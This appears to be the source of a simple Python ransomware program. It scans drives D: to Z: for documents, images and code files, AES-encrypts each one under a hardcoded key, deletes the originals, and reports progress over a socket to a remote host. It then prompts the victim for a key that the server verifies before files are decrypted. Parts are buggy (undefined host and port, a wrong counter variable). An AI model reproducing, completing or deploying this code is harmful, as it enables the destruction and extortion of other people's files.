from Crypto import Random
from Crypto.Cipher import AES
import os.path
import os, sys, socket

class aes_cbc:
    
    def __init__(self):
        self.count = 0
        self.extensions = ['.txt', '.jpeg', '.jpg', '.log', '.html', '.css', '.js', '.doc', '.docx', '.pdf', '.dot', '.wbk', '.docm', '.dotx', '.docb', '.xls', '.xlt', '.xlsx', '.xlsm','.xltx', '.xltm', '.xlsb', '.xla', '.xlam', '.xll', '.xlw', '.ppt', '.pot', '.pps', '.pptx', '.pptm', '.potx', '.potm', '.ppam', '.ppsx', '.ppsm', '.sldx', '.sldm', '.pub', '.xps', '.py', '.java', '.cpp', '.gif', '.png', '.bmp']

    def connect(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip_addr,port))
       # kpro = s.recv(1024)

        #if kpro.endswith(':key'):
        self.key = 'abc123def456ghi7'
        
        obj.filesenc(s)

########################## ENCRYPTION #########################

    def filesenc(self, s):
        drive = 'C'
        l_files = []
        
        while True:
            drive = chr(ord(drive) + 1)
            path = drive + ':\\'
            if os.path.exists(path):
                for dirpath, dirs, files in os.walk(path):
                    for file in files:
                        for ext in self.extensions:
                            if file.endswith(ext) or file.endswith(ext.upper()):
                                f = dirpath+'\\'+str(file)
                                l_files.append(f)
            
            if drive == 'Z':
                break
        
        self.l = len(l_files)
        s.send("Total Files To Be Processed: "+str(self.l)+'\n')

        for file in l_files:
            self.enc_file_generation(file, s)

        obj.dec_k(s)


    def enc_file_generation(self, file_name, s):
        self.count += 1
        with open(file_name, 'rb') as fo:
            text = fo.read()
        enc = self.encryption(text, self.key)

        with open(file_name+str('.enc'), 'wb') as fo:
            fo.write(enc)
        s.send("EN: "+str(count)+"/"+str(self.l)+" Processed : "+ str(file_name))
        os.remove(file_name)

    def encryption(self, message, key, key_size = 256):
        message = self.pad(message)
        iv = Random.new().read(AES.block_size)
        cipher = AES.new(key, AES.MODE_CBC, iv)
        return iv + cipher.encrypt(message)

######################## DECRYPTION #######################

    def filesdnc(self,s):
        drive = 'C'
        
        l_files = []

        while True:
            drive = chr(ord(drive) + 1)
            path = drive + ':\\'
            if os.path.exists(path):
                for dirpath, dirs, files in os.walk(path):
                    for file in files:
                            if file.endswith('.enc'):
                                f = dirpath+'\\'+str(file)
                                l_files.append(f)
                
            if drive == 'Z':
                break
        print "Total Files To Be Processed: ",len(l_files), '\n'        
        for file in l_files:
            self.dnc_file_generation(file)
        s.send('done')
        print s.recv(1024)
    
    def dnc_file_generation(self, file_name):
        with open(file_name, 'rb') as fo:
            text = fo.read()
            dec = self.decryption(text, self.key)
        with open(file_name[:-4], 'wb') as fo:
            fo.write(dec)
        print "DE: ", file_name
        os.remove(file_name)

    def decryption(self, cipherText, dec_key):
        iv = cipherText[:AES.block_size]
        cipher = AES.new(dec_key, AES.MODE_CBC, iv)
        return cipher.decrypt(cipherText[AES.block_size:]).rstrip(b"\0")

########################## PADDING #########################
    
    def pad(self, s):
        return s + b"\0" * (AES.block_size - len(s) % AES.block_size)


####################### DEC FACTOR #########################
    
    def dec_k(self, s):
        inp = raw_input("Enter The Key (Ending With ':key') To Decrypt: ")
        s.send(inp)
        print "Verifying Key...\n"
        k = s.recv(1024)
        
        if k.endswith('dec'):
            self.dec_key = inp[:-4]
            obj.filesdnc(s)
        else:
            print "Wrong Key!"
            obj.dec_k(s)

############################################################

obj = aes_cbc()
